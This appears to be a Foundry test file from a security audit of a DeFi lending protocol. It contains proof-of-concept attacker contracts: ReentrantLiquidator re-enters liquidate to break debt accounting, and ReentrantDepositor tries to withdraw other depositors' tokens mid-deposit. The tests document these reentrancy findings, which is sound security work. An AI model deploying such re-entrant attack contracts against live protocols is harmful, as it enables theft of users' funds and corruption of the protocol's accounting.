// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import { console } from "forge-std/Test.sol";

import { Tranche } from "../../../../contracts/cap/Tranche.sol";
import { Vault } from "../../../../contracts/cap/Vault.sol";
import { FloatingMarket } from "../../../../contracts/cap/market/FloatingMarket.sol";
import { CapDeployer } from "../../../../test/shared/CapDeployer.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface ITokensReceived {
    function tokensReceived(address from, uint256 amount) external;
}

interface ITokensToSend {
    function tokensToSend(address to, uint256 amount) external;
}

/// ERC-777-style collateral: calls a hook on recipients that opted in (a real ERC-777 does this
/// through ERC-1820 for any registered recipient).
contract HookERC20 is ERC20 {
    mapping(address => bool) public hooked;

    constructor() ERC20("Hook", "HOOK") { }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function setHook(bool on) external {
        hooked[msg.sender] = on;
    }

    function _update(address from, address to, uint256 amount) internal override {
        // ERC-777 `tokensToSend`: fires on the sender BEFORE balances move
        if (hooked[from]) ITokensToSend(from).tokensToSend(to, amount);
        super._update(from, to, amount);
        // ERC-777 `tokensReceived`: fires on the recipient AFTER balances move
        if (hooked[to]) ITokensReceived(to).tokensReceived(from, amount);
    }
}

/// A LIQUIDATOR whose slash recipient is itself. When the first tranche's slash pays it, it
/// re-enters FloatingMarket.liquidate before the outer call has stored scaledDebt.
contract ReentrantLiquidator is ITokensReceived, ITokensToSend {
    function tokensToSend(address, uint256) external { }

    FloatingMarket public market;
    uint256 public innerAmount;
    bool entered;

    constructor(FloatingMarket _market) {
        market = _market;
    }

    function liquidate(uint256 amount, uint256 _innerAmount) external {
        innerAmount = _innerAmount;
        market.liquidate(address(this), amount);
    }

    function tokensReceived(address, uint256) external {
        if (entered || innerAmount == 0) return;
        entered = true;
        market.liquidate(address(this), innerAmount);
    }
}

/// A depositor whose ERC-777 `tokensToSend`-style hook fires during Vault.deposit, after the
/// ERC-6909 balance has been minted and before the tokens have been pulled (Vault.sol:34-36).
contract ReentrantDepositor is ITokensReceived, ITokensToSend {
    Vault vault;
    HookERC20 token;
    uint256 public sawBalanceMidFlight;
    uint256 public withdrewMidFlight;
    bool depositing;

    constructor(Vault _vault, HookERC20 _token) {
        vault = _vault;
        token = _token;
    }

    function deposit(uint256 amount) external {
        token.approve(address(vault), amount);
        depositing = true;
        vault.deposit(address(token), amount, address(this));
        depositing = false;
    }

    // ERC-777 pre-transfer hook on the sender: at this point Vault has minted our ERC-6909
    // balance (Vault.sol:34) but has not yet pulled the tokens (Vault.sol:35)
    function tokensToSend(address to, uint256) external {
        if (to != address(vault) || !depositing || withdrewMidFlight != 0) return;
        sawBalanceMidFlight = vault.balanceOf(address(this), address(token));
        withdrewMidFlight = sawBalanceMidFlight;
        // burn the unpaid balance and pull real tokens out of the vault (other depositors' tokens)
        vault.withdraw(address(token), sawBalanceMidFlight, address(this));
    }

    function tokensReceived(address, uint256) external { }
}

/// WS-F / reentrancy. There is no ReentrancyGuard anywhere. FloatingMarket.liquidate computes
/// `remainingScaled` from the pre-liquidation debt, runs the slash loop (external calls out to the
/// collateral token via Vault.withdraw), and only THEN stores `scaledDebt = remainingScaled`.
/// A nested liquidate inside the slash loop is overwritten by the outer store.
contract F3_ReentrantLiquidate is CapDeployer {
    HookERC20 hook;
    FloatingMarket market;
    Tranche senior;
    Tranche junior;
    ReentrantLiquidator attacker;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");

    function setUp() public {
        _deployCap();
        hook = new HookERC20();
        oracle.setPrice(address(hook), 1e18);

        address[] memory assets = new address[](2);
        assets[0] = address(hook);
        assets[1] = address(hook);
        (address m, address[] memory tranches) =
            _createMarket("hooked", defaultMarketOwner, defaultBorrower, assets, capConfig.defaultTrancheWeights);
        market = FloatingMarket(m);
        senior = Tranche(tranches[0]);
        junior = Tranche(tranches[1]);

        _fundTranche(address(senior), address(hook), alice, 950e18);
        _fundTranche(address(junior), address(hook), bob, 50e18);

        attacker = new ReentrantLiquidator(market);
        _grantLiquidator(address(attacker));
        vm.prank(address(attacker));
        hook.setHook(true);
        _depositStable(address(attacker), 400e18); // par mint, not credit-backed
    }

    /// FAILS on current code: I3 (sum of market debt == creditBackedSupply) is broken by one
    /// re-entrant liquidation; the borrower's debt is reduced by R1 while R1 + R2 cUSD was burned.
    function test_F3_reentrantLiquidate_breaksI3() public {
        vm.prank(defaultBorrower);
        market.borrow(defaultBorrower, 500e18);
        assertEq(market.totalDebt(), 500e18);
        assertEq(stablecoin.creditBackedSupply(), 500e18);

        oracle.setPrice(address(hook), 0.5e18); // capital 500, LT 400 < debt 500
        assertLt(market.healthiness(), 1e27);

        uint256 cusdBefore = stablecoin.balanceOf(address(attacker));
        uint256 collateralBefore = hook.balanceOf(address(attacker));

        attacker.liquidate(100e18, 100e18);

        uint256 burned = cusdBefore - stablecoin.balanceOf(address(attacker));
        uint256 received = hook.balanceOf(address(attacker)) - collateralBefore;
        console.log("cUSD burned by liquidator      :", burned);
        console.log("collateral received (tokens)   :", received);
        console.log("market.totalDebt()             :", market.totalDebt());
        console.log("stablecoin.creditBackedSupply():", stablecoin.creditBackedSupply());

        assertEq(burned, 200e18, "two liquidations of 100 were paid for");
        assertEq(market.totalDebt(), stablecoin.creditBackedSupply(), "I3: market debt must equal credit-backed supply");
    }

    /// Passes: documents the downstream consequence. With debt overstated by R2, the borrower
    /// cannot repay in full (burnCreditBacked underflows creditBackedSupply) and unlockedSupply()
    /// on the stablecoin is overstated by R2, i.e. reserve that is not there reads as redeemable.
    function test_F3_afterReentrancy_borrowerCannotRepayInFull() public {
        vm.prank(defaultBorrower);
        market.borrow(defaultBorrower, 500e18);
        oracle.setPrice(address(hook), 0.5e18);
        attacker.liquidate(100e18, 100e18);

        assertEq(market.totalDebt(), 400e18);
        assertEq(stablecoin.creditBackedSupply(), 300e18);

        vm.prank(defaultBorrower);
        vm.expectRevert(); // arithmetic underflow in Stablecoin.burnCreditBacked
        market.repay(type(uint256).max);
    }

    /// Passes: H7 could NOT be turned into a profit. Re-entering Vault.withdraw while holding a
    /// minted-but-unpaid ERC-6909 balance nets to zero once the outer transferFrom settles; the
    /// ordering is a CEI smell, not a demonstrated loss. Kept as the record of what was tried.
    function test_F3_vaultDepositMintBeforeTransfer_noProfit() public {
        ReentrantDepositor dep = new ReentrantDepositor(vault, hook);
        vm.prank(address(dep));
        hook.setHook(true);
        hook.mint(address(dep), 100e18);

        // seed the vault with someone else's tokens so a mid-flight withdraw has something to take
        hook.mint(alice, 100e18);
        vm.startPrank(alice);
        hook.approve(address(vault), 100e18);
        vault.deposit(address(hook), 100e18, alice);
        vm.stopPrank();

        uint256 vaultBefore = hook.balanceOf(address(vault));
        dep.deposit(100e18);

        // whatever the hook did, conservation (I12) holds after the call
        assertEq(hook.balanceOf(address(vault)), vault.totalSupply(vault.id(address(hook))), "I12 holds post-call");
        assertEq(hook.balanceOf(address(vault)), vaultBefore + 100e18 - dep.withdrewMidFlight());
        console.log("6909 balance seen mid-flight:", dep.sawBalanceMidFlight());
        console.log("withdrawn mid-flight        :", dep.withdrewMidFlight());
        console.log("attacker token balance end  :", hook.balanceOf(address(dep)));
        console.log("attacker 6909 balance end   :", vault.balanceOf(address(dep), address(hook)));
    }
}
